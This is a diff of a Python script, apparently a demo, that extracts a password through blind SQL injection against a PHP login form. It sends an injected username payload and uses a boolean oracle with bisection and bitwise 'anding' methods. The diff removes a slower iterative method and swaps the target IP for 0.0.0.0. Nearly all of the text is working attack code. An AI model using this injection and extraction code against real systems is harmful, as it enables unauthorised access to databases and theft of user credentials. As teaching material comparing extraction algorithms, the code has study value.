@@ -25,7 +25,7 @@ C_YELLOW = "\x1b[38;5;3m"
 
 def oracle(q):
     r = requests.post(
-        "http://192.168.0.185/index.php",
+        "http://0.0.0.0/index.php",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
         data="username=" + quote_plus("bmdyy' AND (" + q + ")-- -")
     )
@@ -35,21 +35,6 @@ def oracle(q):
 assert oracle("1=1")
 assert not oracle("1=2")
 print("%s%s[+]%s Oracle verified" % (C_BOLD, C_GREEN, C_RESET))
-
-def iterative():
-    password = ""
-    num_requests = 0
-
-    for index in range(1, PWD_LENGTH + 1):
-        for char in range(128):
-            num_requests += 1
-            if oracle("ASCII(MID(password, %d, 1)) = %d" % (index, char)):
-                password += chr(char)
-                sys.stdout.write(chr(char))
-                sys.stdout.flush()
-                break
-
-    return password, num_requests
 
 def bisection():
     with Pool(N_THREADS) as p:
@@ -93,21 +78,16 @@ def sqlAnding():
 def sqlAnding_thread(index, val):
     return val if oracle("ASCII(MID(password,%d,1)) & %d" % (index, val)) else 0
 
-# Demonstrate the three algorithms
-for i in range(3):
+# Demonstrate the two algorithms
+for i in range(2):
     num_requests = 0
 
     if i == 0:
-        print("\n%s--- ITERATIVE ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
-        start = time.time()
-        password, num_requests = iterative()
-
-    elif i == 1:
         print("\n%s--- BISECTION ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
         start = time.time()
         password, num_requests = bisection()
 
-    elif i == 2:
+    else:
         print("\n%s--- SQL-ANDING ---\n%s[+]%s " % (C_BOLD, C_GREEN, C_RESET), end='')
         start = time.time()
         password, num_requests = sqlAnding()
